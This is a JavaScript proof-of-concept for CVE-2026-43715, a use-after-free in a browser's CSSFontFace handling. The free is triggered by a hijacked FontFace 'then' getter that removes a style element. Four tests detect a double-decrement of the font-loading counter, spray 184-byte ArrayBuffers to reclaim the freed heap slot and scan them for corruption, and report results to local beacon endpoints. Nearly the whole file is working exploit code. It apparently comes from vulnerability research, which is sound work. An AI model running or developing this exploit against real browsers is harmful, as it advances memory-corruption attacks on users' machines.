// p456-fontface-combined.js — CVE-2026-43715: correct UAF + double-decrement detection
//
// V455-correct insight: styleA.remove() is needed to FREE the CSSFontFace.
// setProperty just modifies it (face adopted in buildCompleted).
//
// TEST A: Correct UAF trigger (styleA.remove) + status mismatch detection
//   After double-decrement: m_activeCount underflows to UINT_MAX
//   Loading probe font: incrementActiveCount(UINT_MAX→0), 0≠1 → m_status stays Loaded
//   → document.fonts.status="loaded" while probe.status="loading" = PROOF
//
// TEST B: Correct UAF trigger + AB spray (face IS freed this time)
//
// TEST C: Status check with setProperty (face NOT freed) for comparison
//
// TEST D: Negative control (no UAF)
(function() {
    var RUN = 'v456-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════════════════════
    // TEST A: styleA.remove() UAF + @font-face url() probe for status mismatch
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'v456a'; src: local('Arial'), local('Helvetica'), local('sans-serif'); }";
        document.head.appendChild(styleA);

        // Use the font so CSSSegmentedFontFace client is created
        var span = document.createElement('span');
        span.style.fontFamily = "'v456a', serif";
        span.textContent = 'PROBE';
        document.body.appendChild(span);
        document.body.offsetHeight;

        var faceA = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'v456a') faceA = f;
        });

        if (!faceA) {
            B('A-DEAD', 'NO-FACE');
        } else {
            var thenA = 0, aErr = '';
            var innerFontsStatus = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                if (thenA > 1) return undefined;
                try {
                    // CORRECT TRIGGER: remove <style> entirely → face NOT in staging area → freed
                    styleA.remove();
                    document.body.offsetHeight;

                    // Status INSIDE getter (after buildCompleted freed the face)
                    innerFontsStatus = document.fonts.status;
                    B('A-INNER', {
                        fontsStatus: document.fonts.status,
                        faceStatus: faceA.status,
                        fontsSize: document.fonts.size
                    });
                } catch(e) { aErr += e.message; }
                return undefined;
            }, configurable: true });

            faceA.load();
            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-UAF', {
                thenFired: thenA,
                err: aErr,
                faceStatus: faceA.status,
                fontsStatus: document.fonts.status,
                fontsSize: document.fonts.size,
                innerFontsStatus: innerFontsStatus
            });

            // Status mismatch probe: @font-face with url() → stays Loading (async)
            var probeStyleA = document.createElement('style');
            probeStyleA.textContent = "@font-face { font-family: 'probeA456'; src: url('/nonexistent-probe-v456a.woff2'); }";
            document.head.appendChild(probeStyleA);
            document.body.offsetHeight;

            var probeA = null;
            document.fonts.forEach(function(f) {
                if (f.family.replace(/['"]/g,'') === 'probeA456') probeA = f;
            });

            if (!probeA) {
                B('A-NO-PROBE', 'probe face not in document.fonts');
            } else {
                var probePreA = probeA.status;
                probeA.load();
                var probePostA = probeA.status;
                var fontsPostA = document.fonts.status;

                var mismatch = (probePostA === 'loading' && fontsPostA !== 'loading');

                B('A-PROBE', {
                    probePre: probePreA,
                    probePost: probePostA,
                    fontsStatus: fontsPostA,
                    mismatch: mismatch,
                    verdict: mismatch ? 'DOUBLE-DECREMENT-CONFIRMED' : 'NO-DETECT'
                });

                probeA.loaded.catch(function(){});
            }

            // Also try JS FontFace with url for comparison
            try {
                var jsProbe = new FontFace('jsProbeA456', "url('/nonexistent-probe-v456a-js.woff2')");
                document.fonts.add(jsProbe);
                var jsPre = jsProbe.status;
                jsProbe.load();
                var jsPost = jsProbe.status;
                B('A-JSPROBE', {
                    jsPre: jsPre,
                    jsPost: jsPost,
                    fontsStatus: document.fonts.status
                });
                jsProbe.loaded.catch(function(){});
            } catch(e) { B('A-JSERR', e.message.slice(0,200)); }
        }
    } catch(e) { B('A-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: styleA.remove() + AB spray (face truly freed this time)
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleB = document.createElement('style');
        styleB.textContent = "@font-face { font-family: 'v456b'; src: local('Arial'), local('Helvetica'), local('sans-serif'); }";
        document.head.appendChild(styleB);

        var spanB = document.createElement('span');
        spanB.style.fontFamily = "'v456b', serif";
        spanB.textContent = 'SPRAY';
        document.body.appendChild(spanB);
        document.body.offsetHeight;

        var faceB = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'v456b') faceB = f;
        });

        if (!faceB) {
            B('B-DEAD', 'NO-FACE');
        } else {
            var thenB = 0, bErr = '';
            var sprayB = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenB++;
                if (thenB > 1) return undefined;
                try {
                    styleB.remove();
                    document.body.offsetHeight;

                    // Face freed! Spray 192-byte ABs to reclaim the slot
                    // CSSFontFace is ~184 bytes → libpas 192-byte size class
                    for (var i = 0; i < 500; i++) {
                        var ab = new ArrayBuffer(184);
                        var v = new Uint8Array(ab);
                        for (var j = 0; j < 184; j++) v[j] = 0x41 + (i & 0x1F);
                        sprayB.push({ ab: ab, v: v });
                    }
                    B('B-SPRAYED', { count: sprayB.length });
                } catch(e) { bErr += e.message; }
                return undefined;
            }, configurable: true });

            faceB.load();
            try { delete FontFace.prototype.then; } catch(e) {}

            // After UAF write: m_status = Success (3) written at offset ~130
            // Check if any AB has byte 3 at the right offset
            var hits = [];
            for (var i = 0; i < sprayB.length; i++) {
                var v = sprayB[i].v;
                var expected = 0x41 + (i & 0x1F);
                var corrupted = false;
                for (var j = 0; j < 184; j++) {
                    if (v[j] !== expected) {
                        corrupted = true;
                        hits.push({
                            idx: i,
                            off: j,
                            got: v[j],
                            exp: expected
                        });
                        break;
                    }
                }
            }

            B('B-RESULT', {
                thenFired: thenB,
                err: bErr,
                faceStatus: faceB.status,
                sprayCount: sprayB.length,
                hits: hits.length,
                details: hits.slice(0, 10)
            });

            sprayB = null;
        }
    } catch(e) { B('B-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: setProperty trigger (face NOT freed) + status check
    // Compare with Test A (face freed)
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleC = document.createElement('style');
        styleC.textContent = "@font-face { font-family: 'v456c'; src: local('Arial'); }";
        document.head.appendChild(styleC);
        document.body.offsetHeight;

        var ruleC = styleC.sheet.cssRules[0];
        var faceC = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'v456c') faceC = f;
        });

        if (!faceC) {
            B('C-DEAD', 'NO-FACE');
        } else {
            var thenC = 0, cErr = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenC++;
                if (thenC > 1) return undefined;
                try {
                    ruleC.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;
                } catch(e) { cErr += e.message; }
                return undefined;
            }, configurable: true });

            faceC.load();
            try { delete FontFace.prototype.then; } catch(e) {}

            // Now probe with url() font
            var probeStyleC = document.createElement('style');
            probeStyleC.textContent = "@font-face { font-family: 'probeC456'; src: url('/nonexistent-probe-v456c.woff2'); }";
            document.head.appendChild(probeStyleC);
            document.body.offsetHeight;

            var probeC = null;
            document.fonts.forEach(function(f) {
                if (f.family.replace(/['"]/g,'') === 'probeC456') probeC = f;
            });

            if (probeC) {
                probeC.load();
                B('C-PROBE', {
                    thenFired: thenC,
                    err: cErr,
                    faceStatus: faceC.status,
                    probeFace: probeC.status,
                    fontsStatus: document.fonts.status,
                    mismatch: (probeC.status === 'loading' && document.fonts.status !== 'loading')
                });
                probeC.loaded.catch(function(){});
            } else {
                B('C-NO-PROBE', 'probe not found');
            }
        }
    } catch(e) { B('C-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST D: Negative control — no UAF, just probe
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleD = document.createElement('style');
        styleD.textContent = "@font-face { font-family: 'v456d'; src: local('Arial'); }";
        document.head.appendChild(styleD);
        document.body.offsetHeight;

        var faceD = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'v456d') faceD = f;
        });

        if (faceD) {
            // Normal load (no UAF)
            faceD.load();

            // Probe with url() font
            var probeDStyle = document.createElement('style');
            probeDStyle.textContent = "@font-face { font-family: 'probeD456'; src: url('/nonexistent-probe-v456d.woff2'); }";
            document.head.appendChild(probeDStyle);
            document.body.offsetHeight;

            var probeD = null;
            document.fonts.forEach(function(f) {
                if (f.family.replace(/['"]/g,'') === 'probeD456') probeD = f;
            });

            if (probeD) {
                probeD.load();
                B('D-CONTROL', {
                    faceD: faceD.status,
                    probeD: probeD.status,
                    fontsStatus: document.fonts.status,
                    mismatch: (probeD.status === 'loading' && document.fonts.status !== 'loading')
                });
                probeD.loaded.catch(function(){});
            } else {
                B('D-NO-PROBE', 'probe not found');
            }
        } else {
            B('D-DEAD', 'NO-FACE');
        }
    } catch(e) { B('D-ERR', e.message.slice(0,200)); }


    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
